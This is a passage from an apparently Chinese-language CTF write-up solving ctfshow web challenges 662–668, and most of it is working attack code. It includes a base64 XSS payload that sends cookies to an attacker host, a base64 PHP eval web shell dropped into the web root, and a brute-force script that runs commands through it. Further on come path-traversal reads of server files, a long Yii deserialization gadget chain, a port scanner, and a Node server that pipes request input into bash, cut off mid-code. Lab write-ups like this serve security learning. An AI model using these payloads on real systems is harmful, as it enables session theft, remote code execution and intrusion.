</span></span><span class=line><span class=cl><span class=nv>file</span><span class=o>=</span><span class=sb>`</span><span class=nb>echo</span> <span class=nv>$RANDOM</span><span class=p>|</span>md5sum<span class=p>|</span>cut -c 1-3<span class=sb>`</span>.html
</span></span><span class=line><span class=cl><span class=m>100</span>   <span class=m>105</span>  <span class=m>100</span>   <span class=m>105</span>    <span class=m>0</span>     <span class=m>0</span>   <span class=m>4565</span>      <span class=m>0</span> --:--:-- --:--:-- --:--:--  <span class=m>4565</span>
</span></span><span class=line><span class=cl><span class=nb>echo</span> <span class=s1>&#39;flag_663=ctfshow{xxxx}&#39;</span> &gt; /var/www/html/<span class=nv>$file</span>
</span></span></code></pre></td></tr></table></div></div><p>得了又要爆破,先拿<code>cookie</code>先</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>echo</span> <span class=s1>&#39;dmFyIGltZyA9IG5ldyBJbWFnZSgpOwppbWcuc3JjID0gImh0dHA6Ly8xNzIuMi45NS40L3hzcy5waHA/MT0iK2RvY3VtZW50LmNvb2tpZTsKZG9jdW1lbnQuYm9keS5hcHBlbmQoaW1nKTs=&#39;</span><span class=o>|</span><span class=n>base64</span> <span class=o>-</span><span class=n>d</span> <span class=o>&gt;</span> <span class=n>xss</span><span class=o>.</span><span class=n>js</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>select</span> <span class=n>sys_eval</span><span class=p>(</span><span class=s1>&#39;sudo curl -i -H &#34;X-Forwarded-For:&lt;script&gt;document.location=</span><span class=se>\&#39;</span><span class=s1>http://172.2.95.4/xss.php?cookie=</span><span class=se>\&#39;</span><span class=s1>%2bdocument.cookie;&lt;/script&gt;&#34;  http://172.2.95.5/index.php?action=login&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>(</span><span class=n>www</span><span class=o>-</span><span class=n>data</span><span class=p>:</span><span class=o>/</span><span class=n>var</span><span class=o>/</span><span class=n>www</span><span class=o>/</span><span class=n>html</span><span class=p>)</span> <span class=err>$</span> <span class=n>cat</span> <span class=n>cookie</span><span class=o>.</span><span class=n>txt</span>
</span></span><span class=line><span class=cl><span class=n>PHPSESSID</span><span class=o>=</span><span class=n>kbeu3lvncloob1eqcg5plpvp5e</span><span class=p>;</span> <span class=n>auth</span><span class=o>=</span><span class=n>ZmxhZ182NTY9Y3Rmc2hvd3tlMGI4MGQ2Yjk5ZDJiZGJhZTM2ZjEyMWY3OGFiZTk2Yn0</span><span class=o>=</span>
</span></span></code></pre></td></tr></table></div></div><p>然后写个脚本爆破前三位字符，再像之前一样写个马</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=n>echo</span> <span class=s1>&#39;PD9waHAgQGV2YWwoJF9QT1NUWzFdKTs/Pg==&#39;</span><span class=o>|</span><span class=n>base64</span> <span class=o>-</span><span class=n>d</span> <span class=o>&gt;</span> <span class=o>/</span><span class=k>var</span><span class=o>/</span><span class=n>www</span><span class=o>/</span><span class=n>html</span><span class=o>/</span><span class=n>a</span><span class=o>.</span><span class=n>php</span>
</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>requests</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>session</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>session</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=n>url</span> <span class=o>=</span> <span class=s2>&#34;http://6ad980c6-186e-493f-8373-63593e72a9b6.challenge.ctf.show/a.php&#34;</span>
</span></span><span class=line><span class=cl><span class=n>cookies</span> <span class=o>=</span> <span class=p>{</span><span class=s2>&#34;PHPSESSID&#34;</span><span class=p>:</span> <span class=s2>&#34;kbeu3lvncloob1eqcg5plpvp5e&#34;</span><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>flag</span><span class=o>=</span><span class=mi>0</span>
</span></span><span class=line><span class=cl><span class=nb>list</span><span class=o>=</span><span class=s1>&#39;0123456789abcdef&#39;</span>
</span></span><span class=line><span class=cl><span class=k>while</span><span class=p>(</span><span class=n>flag</span><span class=o>==</span><span class=mi>0</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>list</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=n>j</span> <span class=ow>in</span> <span class=nb>list</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=k>for</span> <span class=n>k</span> <span class=ow>in</span> <span class=nb>list</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                    <span class=n>data</span> <span class=o>=</span> <span class=p>{</span><span class=s2>&#34;1&#34;</span><span class=p>:</span> <span class=s2>&#34;echo `curl http://172.2.95.5:80/&#34;</span> <span class=o>+</span> <span class=nb>str</span><span class=p>(</span><span class=n>i</span><span class=p>)</span> <span class=o>+</span> <span class=nb>str</span><span class=p>(</span><span class=n>j</span><span class=p>)</span> <span class=o>+</span> <span class=nb>str</span><span class=p>(</span><span class=n>k</span><span class=p>)</span> <span class=o>+</span> <span class=s2>&#34;.html`;&#34;</span><span class=p>}</span>
</span></span><span class=line><span class=cl>                    <span class=n>r</span> <span class=o>=</span> <span class=n>session</span><span class=o>.</span><span class=n>post</span><span class=p>(</span><span class=n>url</span><span class=p>,</span> <span class=n>cookies</span><span class=o>=</span><span class=n>cookies</span><span class=p>,</span> <span class=n>data</span><span class=o>=</span><span class=n>data</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                    <span class=nb>print</span><span class=p>(</span><span class=n>r</span><span class=o>.</span><span class=n>text</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                    <span class=k>if</span> <span class=p>(</span><span class=s1>&#39;404&#39;</span> <span class=ow>not</span> <span class=ow>in</span> <span class=n>r</span><span class=o>.</span><span class=n>text</span><span class=p>):</span>
</span></span><span class=line><span class=cl>                        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;http://172.2.95.5:80/&#34;</span> <span class=o>+</span> <span class=nb>str</span><span class=p>(</span><span class=n>i</span><span class=p>)</span> <span class=o>+</span> <span class=nb>str</span><span class=p>(</span><span class=n>j</span><span class=p>)</span> <span class=o>+</span> <span class=nb>str</span><span class=p>(</span><span class=n>k</span><span class=p>)</span> <span class=o>+</span> <span class=s2>&#34;.html&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                        <span class=nb>print</span><span class=p>(</span><span class=n>r</span><span class=o>.</span><span class=n>text</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                        <span class=n>exit</span><span class=p>()</span>
</span></span></code></pre></td></tr></table></div></div><h1 id=web663>web663</h1><p>和web662的flag是一样的</p><p>回头去<code>phpinfo</code>里面找拓展</p><p><img src=/p/ctfshow-final-assessment/QQ20240924-172640.png width=1338 height=321 loading=lazy alt=1></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>https://6ad980c6-186e-493f-8373-63593e72a9b6.challenge.ctf.show/a.php
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>1=echo+`curl+&#39;http://172.2.95.5/phpinfo.php&#39;`;
</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>curl http://172.2.95.5/public../usr/local/lib/php/extensions/no-debug-non-zts-20180731/
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>curl http://172.2.95.5/public../usr/local/lib/php/extensions/no-debug-non-zts-20180731/ctfshow.so -o 1.so
</span></span></code></pre></td></tr></table></div></div><p>然后在so文件里面找到663的<code>flag</code></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>strings 1.so | grep -i flag
</span></span></code></pre></td></tr></table></div></div><h1 id=web664>web664</h1><p>回去看<code>nginx</code>服务器配置文件</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>curl http://172.2.95.5/public../etc/nginx/nginx.conf
</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=n>listen</span>       <span class=mi>8888</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=n>server_name</span>  <span class=n>oa</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=n>root</span>         <span class=o>/</span><span class=k>var</span><span class=o>/</span><span class=n>oa</span><span class=o>/</span><span class=n>web</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=n>index</span> <span class=n>index</span><span class=o>.</span><span class=n>php</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=n>proxy_set_header</span> <span class=n>Host</span> <span class=o>$</span><span class=n>host</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=n>proxy_set_header</span> <span class=n>X</span><span class=o>-</span><span class=n>Real</span><span class=o>-</span><span class=ne>IP</span> <span class=o>$</span><span class=n>remote_addr</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=n>proxy_set_header</span> <span class=n>X</span><span class=o>-</span><span class=n>Forwarded</span><span class=o>-</span><span class=n>For</span> <span class=o>$</span><span class=n>proxy_add_x_forwarded_for</span><span class=p>;</span>
</span></span></code></pre></td></tr></table></div></div><p>那么去看看<code>8888</code></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>1=echo+`curl+&#39;http://172.2.95.5:8888&#39;`;
</span></span></code></pre></td></tr></table></div></div><p>发现是Yii框架，打一个序列化</p><p><a class=link href=http://yiiframework.com/ target=_blank rel=noopener>Yii Framework</a>/<a class=link href=http://github.com/yiisoft/yii2/ target=_blank rel=noopener>2.0.43-dev</a></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=mi>1</span><span class=o>=</span><span class=n>echo</span><span class=o>+</span><span class=err>`</span><span class=n>curl</span> <span class=s2>&#34;http://172.2.95.5:8888/index.php?r=site</span><span class=si>%2F</span><span class=s2>unserialize%26key=flag_663=ctfshow\{fa5cc1fb0bfc986d1ef150269c0de197\}&#34;</span> <span class=o>-</span><span class=n>d</span> <span class=s2>&#34;UnserializeForm[ctfshowUnserializeData]=O%253A32%253A%2522Codeception%255CExtension%255CRunProcess</span><span class=si>%2522%</span><span class=s2>253A2%253A%257Bs%253A9%253A</span><span class=si>%2522%</span><span class=s2>2500%252A</span><span class=si>%2500o</span><span class=s2>utput</span><span class=si>%2522%</span><span class=s2>253BO%253A22%253A</span><span class=si>%2522F</span><span class=s2>aker%255CDefaultGenerator</span><span class=si>%2522%</span><span class=s2>253A1%253A%257Bs%253A10%253A</span><span class=si>%2522%</span><span class=s2>2500%252A</span><span class=si>%2500d</span><span class=s2>efault</span><span class=si>%2522%</span><span class=s2>253Bs%253A5%253A%2522jiang</span><span class=si>%2522%</span><span class=s2>253B%257Ds%253A43%253A</span><span class=si>%2522%</span><span class=s2>2500Codeception%255CExtension%255CRunProcess%2500processes</span><span class=si>%2522%</span><span class=s2>253Ba%253A1%253A%257Bi%253A0%253BO%253A22%253A</span><span class=si>%2522F</span><span class=s2>aker%255CDefaultGenerator</span><span class=si>%2522%</span><span class=s2>253A1%253A%257Bs%253A10%253A</span><span class=si>%2522%</span><span class=s2>2500%252A</span><span class=si>%2500d</span><span class=s2>efault</span><span class=si>%2522%</span><span class=s2>253BO%253A28%253A</span><span class=si>%2522G</span><span class=s2>uzzleHttp%255CPsr7%255CAppendStream</span><span class=si>%2522%</span><span class=s2>253A2%253A%257Bs%253A37%253A</span><span class=si>%2522%</span><span class=s2>2500GuzzleHttp%255CPsr7%255CAppendStream</span><span class=si>%2500s</span><span class=s2>treams</span><span class=si>%2522%</span><span class=s2>253Ba%253A1%253A%257Bi%253A0%253BO%253A29%253A</span><span class=si>%2522G</span><span class=s2>uzzleHttp%255CPsr7%255CCachingStream</span><span class=si>%2522%</span><span class=s2>253A2%253A%257Bs%253A43%253A</span><span class=si>%2522%</span><span class=s2>2500GuzzleHttp%255CPsr7%255CCachingStream</span><span class=si>%2500r</span><span class=s2>emoteStream</span><span class=si>%2522%</span><span class=s2>253BO%253A22%253A</span><span class=si>%2522F</span><span class=s2>aker%255CDefaultGenerator</span><span class=si>%2522%</span><span class=s2>253A1%253A%257Bs%253A10%253A</span><span class=si>%2522%</span><span class=s2>2500%252A</span><span class=si>%2500d</span><span class=s2>efault</span><span class=si>%2522%</span><span class=s2>253Bb%253A0%253B%257Ds%253A6%253A</span><span class=si>%2522s</span><span class=s2>tream</span><span class=si>%2522%</span><span class=s2>253BO%253A26%253A</span><span class=si>%2522G</span><span class=s2>uzzleHttp%255CPsr7%255CPumpStream</span><span class=si>%2522%</span><span class=s2>253A3%253A%257Bs%253A34%253A</span><span class=si>%2522%</span><span class=s2>2500GuzzleHttp%255CPsr7%255CPumpStream</span><span class=si>%2500s</span><span class=s2>ource</span><span class=si>%2522%</span><span class=s2>253BC%253A32%253A%2522Opis%255CClosure%255CSerializableClosure</span><span class=si>%2522%</span><span class=s2>253A212%253A%257Ba%253A5%253A%257Bs%253A3%253A</span><span class=si>%2522u</span><span class=s2>se</span><span class=si>%2522%</span><span class=s2>253Ba%253A0%253A%257B%257Ds%253A8%253A</span><span class=si>%2522f</span><span class=s2>unction</span><span class=si>%2522%</span><span class=s2>253Bs%253A57%253A</span><span class=si>%2522f</span><span class=s2>unction</span><span class=si>%2528%</span><span class=s2>2529%257B%255Chighlight_file</span><span class=si>%2528%</span><span class=s2>2527</span><span class=si>%252F</span><span class=s2>var</span><span class=si>%252F</span><span class=s2>oa</span><span class=si>%252F</span><span class=s2>flag664.php</span><span class=si>%2527%</span><span class=s2>2529%253Bdie</span><span class=si>%2528%</span><span class=s2>2529%253B%257D</span><span class=si>%2522%</span><span class=s2>253Bs%253A5%253A</span><span class=si>%2522s</span><span class=s2>cope</span><span class=si>%2522%</span><span class=s2>253Bs%253A26%253A</span><span class=si>%2522G</span><span class=s2>uzzleHttp%255CPsr7%255CPumpStream</span><span class=si>%2522%</span><span class=s2>253Bs%253A4%253A%2522this</span><span class=si>%2522%</span><span class=s2>253BN%253Bs%253A4%253A</span><span class=si>%2522s</span><span class=s2>elf</span><span class=si>%2522%</span><span class=s2>253Bs%253A32%253A%2522000000002ae55f4e00000000747d2f8c</span><span class=si>%2522%</span><span class=s2>253B%257D%257Ds%253A32%253A</span><span class=si>%2522%</span><span class=s2>2500GuzzleHttp%255CPsr7%255CPumpStream</span><span class=si>%2500s</span><span class=s2>ize</span><span class=si>%2522%</span><span class=s2>253Bi%253A-10%253Bs%253A34%253A</span><span class=si>%2522%</span><span class=s2>2500GuzzleHttp%255CPsr7%255CPumpStream%2500buffer</span><span class=si>%2522%</span><span class=s2>253BO%253A22%253A</span><span class=si>%2522F</span><span class=s2>aker%255CDefaultGenerator</span><span class=si>%2522%</span><span class=s2>253A1%253A%257Bs%253A10%253A</span><span class=si>%2522%</span><span class=s2>2500%252A</span><span class=si>%2500d</span><span class=s2>efault</span><span class=si>%2522%</span><span class=s2>253Bs%253A1%253A%2522j</span><span class=si>%2522%</span><span class=s2>253B%257D%257D%257D%257Ds%253A38%253A</span><span class=si>%2522%</span><span class=s2>2500GuzzleHttp%255CPsr7%255CAppendStream</span><span class=si>%2500s</span><span class=s2>eekable</span><span class=si>%2522%</span><span class=s2>253Bb%253A1%253B%257D%257D%257D%257D&#34;</span><span class=err>`</span><span class=p>;</span>
</span></span></code></pre></td></tr></table></div></div><h1 id=web665-1>web665</h1><p>这个之前就读到了</p><h1 id=web666>web666</h1><p>从内网的数据库里面读取</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>$conn = new mysqli(&#39;localhost&#39;,&#39;root&#39;,&#39;root&#39;,&#39;ctfshow&#39;);
</span></span><span class=line><span class=cl>$res = $conn-&gt;query(&#34;select * from ctfshow_secret&#34;);
</span></span><span class=line><span class=cl>if($res){
</span></span><span class=line><span class=cl>   $row=$res-&gt;fetch_array(MYSQLI_BOTH);
</span></span><span class=line><span class=cl>}
</span></span><span class=line><span class=cl>echo $row[0];
</span></span><span class=line><span class=cl>$conn-&gt;close();
</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>echo &#39;MT0kY29ubiA9IG5ldyBteXNxbGkoJ2xvY2FsaG9zdCcsJ3Jvb3QnLCdyb290JywnY3Rmc2hvdycpOwokcmVzID0gJGNvbm4tPnF1ZXJ5KCJzZWxlY3QgKiBmcm9tIGN0ZnNob3dfc2VjcmV0Iik7CmlmKCRyZXMpewogICAkcm93PSRyZXMtPmZldGNoX2FycmF5KE1ZU1FMSV9CT1RIKTsKfQplY2hvICRyb3dbMF07CiRjb25uLT5jbG9zZSgpOw==&#39;|base64 -d &gt; /tmp/1.txt
</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>1=echo `curl -H &#34;Content-Type: application/x-www-form-urlencoded&#34; -X POST -d @/tmp/1.txt &#34;http://172.2.95.5:8888/assets/shell.php&#34;`;
</span></span></code></pre></td></tr></table></div></div><h1 id=web667>web667</h1><p>扫描一下端口</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl><span class=nx>highlight_file</span><span class=p>(</span><span class=no>__FILE__</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=k>for</span><span class=p>(</span><span class=nv>$i</span><span class=o>=</span><span class=mi>0</span><span class=p>;</span><span class=nv>$i</span><span class=o>&lt;</span><span class=mi>65535</span><span class=p>;</span><span class=nv>$i</span><span class=o>++</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=nv>$t</span><span class=o>=</span><span class=nx>stream_socket_server</span><span class=p>(</span><span class=s2>&#34;tcp://0.0.0.0:&#34;</span><span class=o>.</span><span class=nv>$i</span><span class=p>,</span><span class=nv>$ee</span><span class=p>,</span><span class=nv>$ee2</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=k>if</span><span class=p>(</span><span class=nv>$ee2</span> <span class=o>===</span> <span class=s2>&#34;Address already in use&#34;</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nx>var_dump</span><span class=p>(</span><span class=nv>$i</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>echo &#39;PD9waHAKaGlnaGxpZ2h0X2ZpbGUoX19GSUxFX18pOwpmb3IoJGk9MDskaTw2NTUzNTskaSsrKSB7CiAgJHQ9c3RyZWFtX3NvY2tldF9zZXJ2ZXIoInRjcDovLzAuMC4wLjA6Ii4kaSwkZWUsJGVlMik7CiAgaWYoJGVlMiA9PT0gIkFkZHJlc3MgYWxyZWFkeSBpbiB1c2UiKSB7CiAgICB2YXJfZHVtcCgkaSk7CiAgfQp9&#39;|base64 -d &gt; 1.php
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>chmod 777 1.php
</span></span></code></pre></td></tr></table></div></div><p>扫出来是3000</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>1=echo+`curl+&#39;http://172.2.95.5:3000&#39;`;
</span></span></code></pre></td></tr></table></div></div><h1 id=web668>web668</h1><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-js data-lang=js><span class=line><span class=cl><span class=err>/login</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nx>utils</span><span class=p>.</span><span class=nx>copy</span><span class=p>(</span><span class=nx>user</span><span class=p>.</span><span class=nx>userinfo</span><span class=p>,</span><span class=nx>req</span><span class=p>.</span><span class=nx>body</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=kd>function</span> <span class=nx>copy</span><span class=p>(</span><span class=nx>object1</span><span class=p>,</span> <span class=nx>object2</span><span class=p>){</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=p>(</span><span class=kd>let</span> <span class=nx>key</span> <span class=k>in</span> <span class=nx>object2</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=nx>key</span> <span class=k>in</span> <span class=nx>object2</span> <span class=o>&amp;&amp;</span> <span class=nx>key</span> <span class=k>in</span> <span class=nx>object1</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=nx>copy</span><span class=p>(</span><span class=nx>object1</span><span class=p>[</span><span class=nx>key</span><span class=p>],</span> <span class=nx>object2</span><span class=p>[</span><span class=nx>key</span><span class=p>])</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=nx>object1</span><span class=p>[</span><span class=nx>key</span><span class=p>]</span> <span class=o>=</span> <span class=nx>object2</span><span class=p>[</span><span class=nx>key</span><span class=p>]</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>原型链污染</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-js data-lang=js><span class=line><span class=cl><span class=kd>var</span> <span class=nx>http</span> <span class=o>=</span> <span class=nx>require</span><span class=p>(</span><span class=s1>&#39;http&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=kd>var</span> <span class=nx>querystring</span> <span class=o>=</span> <span class=nx>require</span><span class=p>(</span><span class=s1>&#39;querystring&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kd>var</span> <span class=nx>postHTML</span> <span class=o>=</span> <span class=s1>&#39;123&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nx>http</span><span class=p>.</span><span class=nx>createServer</span><span class=p>(</span><span class=kd>function</span> <span class=p>(</span><span class=nx>req</span><span class=p>,</span> <span class=nx>res</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=kd>var</span> <span class=nx>body</span> <span class=o>=</span> <span class=s2>&#34;&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=nx>req</span><span class=p>.</span><span class=nx>on</span><span class=p>(</span><span class=s1>&#39;data&#39;</span><span class=p>,</span> <span class=kd>function</span> <span class=p>(</span><span class=nx>chunk</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nx>body</span> <span class=o>+=</span> <span class=nx>chunk</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=p>});</span>
</span></span><span class=line><span class=cl>  <span class=nx>req</span><span class=p>.</span><span class=nx>on</span><span class=p>(</span><span class=s1>&#39;end&#39;</span><span class=p>,</span> <span class=kd>function</span> <span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nx>body</span> <span class=o>=</span> <span class=nx>querystring</span><span class=p>.</span><span class=nx>parse</span><span class=p>(</span><span class=nx>body</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nx>res</span><span class=p>.</span><span class=nx>writeHead</span><span class=p>(</span><span class=mi>200</span><span class=p>,</span> <span class=p>{</span><span class=s1>&#39;Content-Type&#39;</span><span class=o>:</span> <span class=s1>&#39;text/html; charset=utf8&#39;</span><span class=p>});</span>
</span></span><span class=line><span class=cl> <span class=k>try</span><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span><span class=p>(</span><span class=nx>body</span><span class=p>.</span><span class=nx>cmd</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nx>res</span><span class=p>.</span><span class=nx>write</span><span class=p>(</span><span class=s2>&#34;username：&#34;</span> <span class=o>+</span> <span class=nx>body</span><span class=p>.</span><span class=nx>cmd</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=kd>var</span> <span class=nx>result</span><span class=o>=</span> <span class=nx>global</span><span class=p>.</span><span class=nx>process</span><span class=p>.</span><span class=nx>mainModule</span><span class=p>.</span><span class=nx>constructor</span><span class=p>.</span><span class=nx>_load</span><span class=p>(</span><span class=s1>&#39;child_process&#39;</span><span class=p>).</span><span class=nx>execSync</span><span class=p>(</span><span class=s1>&#39;bash -c &#34;&#39;</span><span class=o>+</span><span class=nx>body</span><span class=p>.</span><span class=nx>cmd</span><span class=o>+</span><span class=s1>&#39;&#34;&#39;</span><span class=p>).</span><span class=nx>toString</span><span class=p>();</span>
